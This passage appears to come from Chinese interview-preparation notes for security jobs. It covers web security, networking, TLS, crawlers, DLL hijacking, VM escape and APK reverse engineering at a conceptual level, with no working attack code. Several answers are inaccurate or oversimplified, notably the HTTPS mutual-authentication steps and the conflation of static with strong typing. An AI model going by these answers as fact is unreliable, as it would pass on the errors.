start="8"><li>token和referer做横向对比，谁安全等级高？</li></ol><p>token安全等级高。<br>Referer可以伪造，而且不是任何服务器都可以取得referer，如果从https跳到http，也不会发送referer。并且一些flash版本可以自定义referer。对于token要保证其足够随机且不可泄露。客户端建议存储到sessionstage里。</p><ol start="9"><li>对referer的验证，从什么角度去做？如果做，怎么杜绝问题</li></ol><p>对header中的referer的验证，一个是空referer，一个是referer过滤或检测不完善。<br>为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p><ol start="10"><li>@ 针对token，对token哪方面进行测试</li></ol><p>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击。<br>信息泄露方面，可以是缓存、日志、get或利用跨站。<br>很多跳转的登录都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了。<br>另外也可以结合其它业务来描述token的安全性及设计怎么不好怎么被绕过比如抢红包业务之类的。</p><ol start="11"><li>SSL&#x2F;TLS握手过程</li></ol><p>SSL(安全套接字层)是为HTTP开发的原始安全协议。不久前，SSL被TLS(传输层安全性)所取代。SSL握手现在称为TLS握手。<br>TLS握手步骤大致如下：<br>(1) 客户端问候(client hello) 消息：客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的TLS版本，支持的密码套件，以及一串被称为“客户端随机数(client random)”的随机字节。<br>(2) 服务端问候(server hello) 消息：作为对client hello消息的回复，服务器发送一条消息，内含服务器的SSL证书、服务器选择的密码套件，以及“服务器随机数(server random)”，即由服务器生成的另一串随机字符。<br>(3) 身份验证：客户端使用颁发该证书的证书颁发机构验证服务器的SSL证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。<br>(4) 预主密钥：客户端再发送一串随机字节，即“预主密钥(premaster secret)”。预主密钥是使用公钥加密的，只能使用服务器的私钥解密。（客户端从服务器的SSL证书中获得公钥）。<br>(5) 私钥被使用：服务器对预主密钥进行解密。<br>(6) 生成会话密钥：客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同结果。<br>(7) 客户端就绪：客户端发送一条“已完成”消息，该消息用会话密钥加密。<br>(8) 服务端就绪：服务端发送一条“已完成”消息，该消息用会话密钥加密。<br>(9) 实现安全对称加密：已完成握手，并使用会话密钥继续进行通信。</p><ol start="12"><li>@ TCP三次握手过程以及对应的状态转换</li></ol><p>(1) 客户端向服务端发送一个SYN包，包含客户端使用的端口号呃初始序列号x；<br>(2) 服务端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文。包含确认号xx1和服务器端的初始序列号y；<br>(3) 客户端收到服务端返回的SYN，ACK报文后，向服务器发送一个确认号为yy1、序列号为xx1的ACK报文，一个标准的TCP连接完成。</p><ol start="13"><li>TCP和UDP协议区别</li></ol><p>tcp面向连接，udp面向报文；tcp对系统资源的要求多，udp结构简单；tcp保证数据完整性和顺序，udp不保证</p><ol start="14"><li>https的建立过程</li></ol><p>(1) 客户端发送请求到服务器端<br>(2) 服务器端返回证书和公开密钥，公开密钥作为证书的一部分存在<br>(3) 客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端<br>(4) 服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端<br>(5) 客户端使用共享密钥解密数据<br>(6) SSL加密建立</p><ol start="15"><li>http状态码：503，502，501</li></ol><p>503: 由于超载或系统维护，服务器暂时无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中。<br>502: 作为网关或代理工作的服务器尝试执行请求时，从远程服务器收到了一个无效的响应。<br>501: 服务器不支持请求的功能，无法完成请求。</p><ol start="16"><li>@ http请求方式及各自作用</li></ol><p>(1) GET–请求指定的页面信息，并返回实体主体。<br>(2) HEAD–类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。<br>(3) POST–向指定资源提交数据进行处理请求（例如提交表单或上传文件）。数据被包含在请求体中。POST请求可能导致新的资源建立和&#x2F;或已有资源的修改。<br>(4) PUT–从客户端向服务器传送的数据取代指定的文档和内容。<br>(5) DELETE–请求服务器删除指定的内容。<br>(6) CONNECT–HTTP&#x2F;1.1协议中预留给能够连接改为管道方式的代理服务器。<br>(7) OPTIONS–允许客户端查看服务器性能。<br>(8) TRACE–回显服务器收到的请求。<br>(9) PATCH–是对PUT方法的补充，用来对已知资源进行局部更新。</p><ol start="17"><li><p>@ 计算机网络的分层及分别有哪些协议？<br>OSI七层<br>物理层：RJ45, 802.3<br>数据链路层：SDLC，HDLC，PPP，STP<br>网络层：IP，IPX，ICMP，IGMP，ARP，RARP，OSPF<br>传输层：TCP，UDP<br>应用层(会话层，表示层，应用层)：文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p></li><li><p>HttpOnly</p></li></ol><p>这是cookie中的一个参数。如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，增加了cookie安全性。</p><ol start="19"><li>a.baidu.com和b.baidu.com是否同源</li></ol><p>源：主机，协议，端口。同源要求三者必须都相同，而这两个域名不同，因此不属于同源。</p><ol start="20"><li>算法？了解过什么排序？</li></ol><p>个人理解的算法就是解决某一类问题的通用方式。<br>排序算法有：冒泡排序，选择排序，插入排序，希尔排序，归并排序，快速排序，堆排序，计数排序，桶排序，基数排序。<br><img src="/simg/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%801.png" alt="排序"></p><ol start="21"><li>爬虫</li></ol><p>爬虫是一种用来自动浏览万维网的网络机器人。<br>会写python爬虫。</p><ol start="22"><li>页面存在很多js的时候，用什么</li></ol><p>如果需要操纵浏览器拿到浏览器显示出来的数据，可以使用selenium模块。</p><p>当页面存在很多js时，要分析如何找到是哪个js在控制数据的生成及js发送请求的路径<br>首先拿到详情页的请求路径：<br><code>url_1=&#39;https://www.example.com/a/b.html&#39;</code><br>然后把url_1最后一个斜杠后面的内容替换掉，<br><code>url_2=&#39;https://www.example.com/%s/c.js&#39;%(url_1.split(&#39;/&#39;)[3])</code><br>把url_1用 <code>/</code> 分割，拿到第四部分，即索引为3，然后拼接进去即可<br>这样就构造好了一个详情页数据请求路径，然后直接去访问这个路径就能拿到数据，也不用再访问详情页。</p><ol start="23"><li>爬虫的待爬取URL量级比较大的时候，如何对其去重</li></ol><p>使用布隆过滤器。<br>原理：<br>BloomFilter会开辟一个m位的bitArrary(位数组)，开始所有数据全部置为0。当一个元素( <code>www.baidu.com</code> )过来时，能过多个哈希函数(h1,h2,h3…)计算不同的在哈希值，并通过哈希值找到对应的bitArray下标处，将里面的值0置位1。</p><ol start="24"><li>多线程，异步，协程，多路复用 用哪一个最快，为什么？</li></ol><p>多线程？not sure</p><ol start="25"><li>浏览器的常用编码</li></ol><p>UTF-8<br>UTF-16</p><ol start="26"><li>web常用的加密算法有什么？</li></ol><p>不可逆：MD5，SHA-256<br>对称：DES，AES<br>非对称：RSA</p><ol start="27"><li>病毒和蠕虫的区别？</li></ol><p>蠕虫和病毒都会自我复制。<br>区别：<br>蠕虫：蠕虫不依附于计算机上的其它程序或文件。不需要人工干预，利用漏洞主动攻击，具有较强的独立性。<br>病毒：病毒把自身附加于程序或者文件，从一台计算机传播到另一台计算机，当运行程序或者打开文件时，才会感染计算机。在没有人为操作的情况下，病毒无法传播，必须通过外部操作来触发他。</p><ol start="28"><li>@ DNS欺骗</li></ol><p>DNS欺骗就是攻击者在域名解析请求的过程中冒充DNS域名服务器进行响应，回复给用户一个虚假的地址，也就是攻击者冒充顶替域名服务器的一种欺骗行为。<br>原理：攻击者冒充域名服务器，将目标IP地址设为自己的IP地址，接着，用户访问时就进入到攻击者的主页里，将原来的域名网站冒充顶替掉了，这就是DNS欺骗的基本原理。</p><ol start="29"><li>移动端的调试经验 apk，ipa包分析</li></ol><p>不太了解。参考下面两篇文章：<br><a href="https://juejin.cn/post/7264235181778960421">Android-使用 APK 分析器分析 build</a><br><a href="https://juejin.cn/post/7185079396678991928">iOS 包体积优化1 - 总览</a></p><ol start="30"><li>@ 对于云安全的理解</li></ol><p>云安全定义:<br>云安全是为保护云端应用、数据和基础架构安全而采取的一套信息安全措施。这涉及应用各种安全政策、实践、控制措施以及诸如身份和访问权限管理和数据泄露防护工具等其他方法，目的是帮助保护云环境免受未经授权的访问、在线攻击和内部威胁的侵害。</p><p>云安全的工作原理:<br>云安全主要关注如何搭配实现各种策略、流程和技术，以确保实现数据保护、支持法规遵从，并为用户和设备提供对隐私、访问和身份验证方面的控制措施。<br>云服务提供商 (CSP) 通常采用责任共担模型，这意味着，实现云计算安全既是云服务提供商的责任，也是您（即客户）的责任。您可以将该模型看作一个责任框架，用以界定哪些安全任务归云服务提供商负责，哪些又是客户的职责。<br>一般来说，CSP始终负责云及其核心基础架构的安全，而客户则应保护在云端运行的所有内容的安全，例如网络控件、身份和访问权限管理、数据和应用。</p><p>云安全的安全风险：<br>来自外部：数据泄露和数据丢失、钓鱼式攻击、恶意软件、DDoS 攻击和易受攻击的 API。<br>来自内部：缺少洞察性、配置不当、访问权限管理、动态工作加载、法规遵从。</p><p>云安全的优势：<br>更高的可见性、集中式安全性、减少费用、数据保护、云合规性、高级威胁检测。</p><p><a href="https://cloud.google.com/learn/what-is-cloud-security?hl=zh-cn">云安全参考资料</a></p><ol start="31"><li>虚拟机逃逸的理解</li></ol><p>虚拟机逃逸(Virtual Machine Escape)是一种网络安全攻击技术，指的是攻击者通过利用虚拟机(VM)内的漏洞或设计缺陷，实现从虚拟机内部向宿主机(Host)的操作系统进行攻击。<br>虚拟机逃逸攻击的原理很大程度上依赖于虚拟化技术的实现方式。虚拟化技术通常由Hypervisor负责，其主要任务是管理和调度多个虚拟机之间的资源分配。在虚拟机逃逸攻击中，攻击者寻找并利用虚拟机监视器的漏洞或设计缺陷，绕过虚拟机与宿主机之间的隔离层，实现对宿主机的操作系统及其资源的访问和控制。<br>通常包括以下几种类型：<br>(1) 利用虚拟机监视器漏洞，如缓冲区溢出、整数溢出等，攻击者通过这些漏洞实现代码执行，最终获得宿主机的控制权限。<br>(2) 利用虚拟设备或驱动程序的设计缺陷，攻击者可能通过虚拟网络接口、虚拟磁盘等设备逃出虚拟机环境。<br>(3) 利用虚拟机管理工具和接口的安全漏洞，例如虚拟机控制台、虚拟机迁移等，攻击者可能在不被察觉的情况下实现虚拟机逃逸。</p><p>举例：QEMU逃逸（CVE-2020-14364）<br><a href="https://blog.nsfocus.net/virtual/">虚拟机逃逸技术介绍</a><br><a href="https://xz.aliyun.com/t/12540">FreeBSD系统的虚拟机逃逸漏洞</a></p><ol start="32"><li>@ dll文件是什么意思，有什么用？DLL劫持原理</li></ol><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序扩展”，是软件文件类型。<br>在Windows系统中，许多应用程序不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。<br>用处：使用DLL有助于促进代码的模块化、代码重用、内存的有效使用和减少所占用的磁盘空间。<br><a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/dynamic-link-library">什么是 DLL</a></p><p>DLL劫持原理：<br>如果在进程尝试加载一个DLL时没有并没有指定DLL的绝对路径，那么Windows会尝试去按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录，那么就能够欺骗系统去加载恶意的DLL，形成”劫持”,CWE将其归类为UntrustedSearch Path Vulnerability,比较直译的一种解释。<br><a href="https://www.freebuf.com/articles/endpoint/366348.html">DLL劫持从零到CobaltStrike上线免杀</a><br><a href="https://www.mayuexuan.com/dll%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/">DLL劫持原理</a></p><ol start="33"><li>get传参和post传参有什么区别？</li></ol><p>(1) GET请求只能进行URI编码，而POST支持多种编码方式。<br>(2) 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。<br>(3) GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。<br>(4) GET参数通过URL传递，而且是有长度限制的，POST放在请求体中，没有长度限制。</p><ol start="34"><li>讲一下HTTPS双向认证</li></ol><p>(1) 客户端发起建立HTTPS连接请求，将SSL协议版本的信息发送给服务端<br>(2) 服务端将本机的公钥证书(server.crt)发送给客户端<br>(3) 客户端读取公钥证书(servet.crt)，取出服务端公钥<br>(4) 客户端将客户端公钥证书(client.crt)发送给服务器端<br>(5) 服务器端使用根证书(root.crt)解密客户端公钥证书，拿到客户端公钥<br>(6) 客户端发送自己支持的加密方案给服务器端<br>(7) 服务器端根据自己和客户端的能力，选择一个双方都能接受的加密方案，使用客户端的公钥加密后发送给客户端<br>(8) 客户端使用自己的私钥解密加密方案，生成一个随机数R，使用服务器公钥加密后传给服务器端<br>(9) 服务器端用自己的私钥去解密这个密文，得到了密钥R<br>(10) 服务器端和客户端在后续通讯过程就使用这个密钥R进行通信了</p><ol start="35"><li>http的请求方式，具体说说</li></ol><p>见问题16</p><ol start="36"><li>常见的http方法有哪些，他们之间的区别是什么？</li></ol><p>见问题16</p><ol start="37"><li>常见状态码你知道吗？分别说一下200，201，301，302，500，503的含义</li></ol><p>200–请求成功，一般用于GET和POST请求<br>201–已创建，成功请求并创建了新的资源<br>301–永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替<br>302–临时移动。与301类似。但资源只是临时被移动。客户端应使用原有URI<br>500–服务器内部错误，无法完成请求<br>503–由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中。</p><ol start="38"><li>常见请求消息头的作用，分别说一下cookie, referer, user-agent的作用？</li></ol><p>HTTP头字段(HTTP header fields)，是指在超文本传输协议(HTTP)的请求和响应消息中的消息头部分。<br>Cookie: 服务器通过Set-Cookie发送的一个超文本传输协议Cookie<br>Referer: 判断请求来源，以及防止盗链。<br>User-Agent: 浏览器身份标识字符串</p><ol start="39"><li>响应消息头的作用，分别说一下location, Access-Control-Allow-Origin, WWW-Authenticate</li></ol><p>Location: 表示客户应当到哪里去提取文档，用于接收端定位到资源的位置(URL)上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态码302<br>Access-Control-Allow-Origin: 携带了服务端验证后允许的跨域请求域名。<br>WWW-Authenticate: 表明客户端请求实体应该使用的授权方案</p><ol start="40"><li>Cookie响应消息头的secure和httponly分别作用是什么？</li></ol><p>见问题3</p><ol start="41"><li>静态、动态语言区别</li></ol><p>动态语言（弱类型语言）：是运行时才确定数据类型的语言，变量在使用之前无需申明类型，通常变量的值是被赋值的那个值的类型。比如PHP、ASP、JavaScript、python、Perl<br>静态语言（强类型语言）：是编译时变量的数据类型就可以确定的语言，大多数静态语言要求在使用变量之前就必须声明数据类型。比如Java, C, C++, C#</p><p>区别：<br>静态语言由于强制声明数据类型，让开发工具(IDE)对代码有很强的判断能力，在实现复杂的业务逻辑和开发大型商业系统、以及那些声明周期很长的应用中，开发者可以依托强大的IDE来更高效更安全地开发。<br>动态语言代码量更少，看起来更简洁；思维不受约束，可以任意发挥，把更多的精力放在产品本身上；集中思考业务逻辑实现，思考过程就是实现过程。</p><ol start="42"><li>常用的脚本语言和数据库有哪些？</li></ol><p>常用脚本语言：js，php，ruby，python<br>常用数据库：Oracle，MySQL，SQL server，mssql，redis</p><ol start="43"><li>系统、脚本语言、中间件如何组合？</li></ol><p>数据库：Oracle大型数据库、Access、SQL Server(ms SQL)、MySQL常用中小型数据库<br>中间件：IIS、Apache、Nginx、Tomcat<br>脚本：PHP、ASP、ASPX(ASP.NET)、JSP</p><p>综合搭配：<br>Linux + Apache + PHP +MySQL<br>Linux + Nginx + PHP + MySQL<br>Windows + IIS +ASPX(ASP.NET) + SQL Server(ms SQL)<br>Linux + Tomcat + JSP +MySQL<br>Linux + Tomcat + JSP + Oracle</p><ol start="44"><li>@ 会不会逆向APK，会不会嵌入式</li></ol><p>了解过一点。</p><p>直接修改 <code>xxx.apk</code> 的后缀为 <code>xxx.zip</code> ，解压文件目录。<br><img src="/simg/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%802.png" alt="计算机基础2"><br>所有的代码处于 <code>classes.dex</code> 中，图片布局等资源处于 <code>res</code> 目录下。 <code>AndroidManifest.xml</code> 和 <code>activity_main.xml</code> 文件是一堆整齐排列的16进制数，需要使用apktool（反编译资源），反编译APK中的资源。</p><p>经过apktool反编译后生成的具体文件：<br><img src="/simg/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%803.png" alt="计算机基础3"><br>1、AndroidManifest.xml：经过反编译还原后的 manifest 文件<br>2、original 文件夹：存放了未经反编译过、原始的 AndroidManifest.xml 文件<br>3、res 文件夹：存放了反编译出来的所有资源<br>4、smali 文件夹：存放了反编译出来的所有代码，只不过格式都是.smali类型的</p><p>使用 apktool 反编译后的代码处于 smali 文件夹下，且都是.smali格式的<br>将其转换成能看懂的Java代码（反编译代码）：使用dex2jar + jd-gui</p><p>dex2jar的作用是将dex文件转换为jar文件<br>jd-gui查看jar包里的具体内容</p><p>修改完成后用apktool将文件夹重新打包成apk，然后使用 AndroidStudio 生成一个签名文件。最后再执行签名命令即可安装。<br><a href="https://juejin.cn/post/7158107697907236878">Android逆向</a></p><p>嵌入式只了解一点概念，是一种嵌入机械或电气系统内部、具有专一功能和实时计算机性能的电脑系统。</p><ol start="45"><li>正则能不能写？</li></ol><p>能写。<br><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式</a></p><ol start="46"><li>对https了解吗？讲一下加密和解密流程？</li></ol><p>HTTPS(Hypertext Transfer Protocol Secure: 超文本传输安全协议) 是一种透过计算机网络进行安全通信的传输协议。<br>HTTPS经由HTTP通信，但利用SSL&#x2F;TLS来加密数据包。HTTPS开发的主要目的是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。<br>加解密流程见问题11。</p><ol start="47"><li>@ 陈述一下缓冲区溢出</li></ol><p>缓冲区溢出是一种异常现象，当软件向缓冲区中写入数据使缓冲区容量溢出时，会导致相邻存储区位置被覆盖。过量信息被传递到没有足够空间的容器中，而这些信息最终会替换相邻容器中的数据。攻击者可以利用缓冲区溢出修改计算机的内存，以破坏或控制程序的执行。<br>造成此现象的原因有：</p><ul><li>存在缺陷的程序设计</li><li>尤其是C语言，不像其它一些高级语言会自动进行数组或指针的堆栈区块边界检查，增加溢出风险。</li><li>C语言中的C标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</li></ul><p><a href="https://zh.wikipedia.org/zh-sg/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">缓冲区溢出</a></p><ol start="48"><li><p>栈溢出原理<br>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p></li><li><p>@ JS混淆解密<br>入门：<br>混淆是将 JavaScript 代码压缩、优化并加上一些无意义的代码，从而使其难以被人阅读和理解。<br>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> _0x123456=<span class="number">0</span>;_0x123456&lt;<span class="number">100</span>;_0x123456++)&#123;<span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](_0x123456);&#125;&#125;</span><br><span class="line"><span class="title function_">test</span>();</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(i);&#125;&#125;</span><br><span class="line"><span class="title function_">test</span>();</span><br></pre></td></tr></table></figure><p>进阶：<br>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getRanNum = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0xf66axf = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0xf66axd = <span class="number">0</span>; _0xf66axd &lt; <span class="number">4</span>; _0xf66axd++) &#123;</span><br><span class="line">        <span class="keyword">var</span> _0xf66ax10 = <span class="title class_">Math</span>[_0xebfe[<span class="number">55</span>]](<span class="title class_">Math</span>[_0xebfe[<span class="number">42</span>]]() * <span class="number">25</span>);</span><br><span class="line">        _0xf66axf[_0xebfe[<span class="number">57</span>]](<span class="title class_">String</span>[_0xebfe[<span class="number">56</span>]](<span class="number">65</span> + _0xf66ax10))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _0xf66axf[_0xebfe[<span class="number">58</span>]](_0xebfe[<span class="number">52</span>])</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getRanNum = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> res = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> number = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">    res[<span class="string">&#x27;push&#x27;</span>](<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">65</span> + number));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="50"><li><p>IP数据报长度达到多少会被分片？<br>1472字节。<br>因为MTU为1500，固定长度是28字节，所以MTU减去固定长度得到1472字节。</p></li><li><p>classloader是什么？<br>ClassLoader 顾名思义就是类加载器,ClassLoader 作用：</p></li></ol><p>负责将 Class 加载到 JVM 中<br>审查每个类由谁加载（父优先的等级加载机制）<br>将 Class 字节码重新解析成 JVM 统一要求的对象格式</p><ol start="52"><li><p>Java反序列化和字节码的区别？<br>反序列化是将先前序列化的数据恢复为对象的过程。<br>字节码是一种中间代码，它是由Java编译器生成的，用于在JVM上执行。<br>Java源代码首先编译为字节码，然后由JVM解释或编译为本机机器代码。</p></li><li><p>DNS迭代查询和递归查询的区别？<br>DNS解析流程分为递归查询和迭代查询，递归查询是以本地名称服务器为中心查询， 递归查询是默认方式，迭代查询是以DNS客户端，也就是客户机器为中心查询。</p></li><li><p>Java的底层是什么？<br>java的底层语言是C语言和是C++语言</p></li><li><p>Java的类和接口区别是什么？<br>1、抽象类可以有方法体的方法，但接口没有（Java 8 以前）。<br>2、接口中的成员变量隐式为 static final ，但抽象类不是的。<br>3、一个类可以实现多个接口，但只能继承一个抽象类。</p></li><li><p>jvm的作用<br>JVM（Java Virtual Machine，Java虚拟机）是Java编程语言的核心组件之一，它的主要作用是在运行Java程序时提供一种平台独立性和内存管理。<br>主要作用：<br>1、字节码执行<br>2、内存管理<br>3、性能优化<br>4、安全性</p></li><li><p>@ python如何写爬虫？能正常访问目标页面但不能爬取信息怎么办？<br>使用Python和requests库进行网页请求和BeautifulSoup库进行网页解析。</p></li></ol><p>能正常访问但不能爬取信息：<br>1、网页内容是动态加载的： 有时，网页内容可能是使用JavaScript动态加载的，而不是通过初始HTML请求返回的。在这种情况下，你需要使用一个库，如Selenium，来模拟浏览器行为，以确保你能够获取完整的页面内容。Selenium可以控制浏览器执行JavaScript，并获取动态生成的内容。<br>2、数据在异步请求中加载： 一些网站使用异步请求加载数据，这意味着数据不在页面加载时立即可用。你需要查看网页上的网络请求，并确定哪个请求返回所需的数据。然后，你可以使用库，如requests或aiohttp，来模拟这些请求并获取数据。<br>3、网站采用反爬虫措施： 一些网站可能会采取反爬虫措施，如验证码、IP封锁或频率限制。你需要小心处理这些情况，以确保你的爬虫不被封锁。这可能需要使用代理服务器或调整请求频率。</p><ol start="58"><li>@ ACL访问控制<br>ACL，是Access Control List的简写，中文名称叫做“访问控制列表”。它是由一系列条件规则（即描述报文匹配条件的判断语句）组成， 这些条件规则可以是报文的源地址、目的地址、端口号等，是一种应用在网络设备各种软硬接口上的指令列表。<br>ACL本质上是一种报文过滤器，规则是过滤器的滤芯。设备基于这些规则进行报文匹配，可以过滤出特定的报文，并根据应用ACL的业务模块的处理策略来允许或阻止该报文通过。<br>基于ACL规则定义方式，可以将ACL分为基本ACL、高级ACL、二层ACL等种类。基本ACL根据源IP地址、分片信息和生效时间段等信息来定义规则，对IPv4报文进行过滤。如果只需要根据源IP地址对报文进行过滤，可以配置基本ACL。</li></ol><p>ACL的作用：<br>1、ACL可以限制网络流量、提高网络性能。<br>2、ACL提供对通信流量的控制手段。<br>3、ACL是提供网络安全访问的基本手段。<br>4、ACL可以在路由器端口处决定哪种类型的通信流量被转发或被阻塞。</p><ol start="59"><li><p>@ tcp&#x2F;ip几层，分别是什么？<br>tcp&#x2F;ip协议包含四层：1、应用层；2、传输层；3、网络层；4、网络接口层。 应用层位于TCP&#x2F;IP协议的第一层，是直接为应用进程提供服务的；运输层位于协议的第二层，在整个TCP&#x2F;IP协议中起到了中流砥柱的作用；网络层位于协议的第三层；网络接口层位于协议的第四层。</p></li><li><p>安全设备<br>安全狗，WAF，入侵检测系统IDS，入侵防御系统IPS。漏洞扫描器，DDOS防护，监控设备：SOC安全运营中心（奇安信NGSOC）。</p></li><li><p>ipsec vpn<br>IPSec VPN 是一种 VPN 软件，它使用 IPSec 协议在 Internet 上创建加密隧道。它提供端到端加密，这意味着数据在计算机上被加密，在接收服务器上被解密。<br>IPSec 协议适用于 OSI 模型中间的网络和传输层。</p></li></ol><p>IPSec VPN的应用场景分为3种：<br>1、Site-to-Site（站点到站点或者网关到网关）：如弯曲评论的3个机构分布在互联网的3个不同的地方，各使用一个商务领航网关相互建立VPN隧道，企业内网（若干PC）之间的数据通过这些网关建立的IPSec隧道实现安全互联。<br>2、End-to-End（端到端或者PC到PC）： 两个PC之间的通信由两个PC之间的IPSec会话保护，而不是网关。<br>3、End-to-Site（端到站点或者PC到网关）：两个PC之间的通信由网关和异地PC之间的IPSec进行保护。</p><ol start="62"><li><p>钩子hook函数了解吗？<br>钩子(hook)函数是Windows消息处理机制的一部分，通过设置“钩子”，应用程序可以在系统级对所有消息、事件进行过滤，访问在正常情况下无法访问的消息。 钩子的本质是一段用以处理系统消息的程序，通过系统调用，把它挂入系统。</p></li><li><p>ATT&amp;CK框架了解吗、到什么程度，是否有过应用？<br>ATT&amp;CK是由MITRE机构开发的攻击模型框架，其全称为Adversarial Tactics, Techniques, and Common Knowledge（对抗性战术，技术以及公共知识库），是一个基于现实世界所观察到的攻击向量所组成的一个公开的对抗性战术和技术知识库，其可被用于私营机构、政府部门、网络安全产品和服务社区作为特定威胁模型和方法的开发基础。</p></li></ol><p>ATT&amp;CK框架的使用：<br>1、初始访问<br>2、执行<br>3、持久化<br>4、提升权限<br>5、防御绕过<br>6、凭据访问<br>7、发现<br>8、横向移动<br>9、收集<br>10、命令和控制<br>11、数据渗漏<br>12、影响</p><p>ATT&amp;CK使用场景<br>（1）对抗模拟<br>ATT＆CK可用于创建对抗性模拟场景，测试和验证针对常见对抗技术的防御方案。<br>（2）红队&#x2F;渗透测试活动<br>红队、紫队和渗透测试活动的规划、执行和报告可以使用ATT＆CK，以便防御者和报告接收者以及其内部之间有一个通用语言。<br>（3）制定行为分析方案<br>ATT＆CK可用于构建和测试行为分析方案，以检测环境中的对抗行为。<br>（4）防御差距评估<br>ATT＆CK可以用作以行为为核心的常见对抗模型，以评估组织企业内现有防御方案中的工具、监视和缓解措施。在研究MITRE 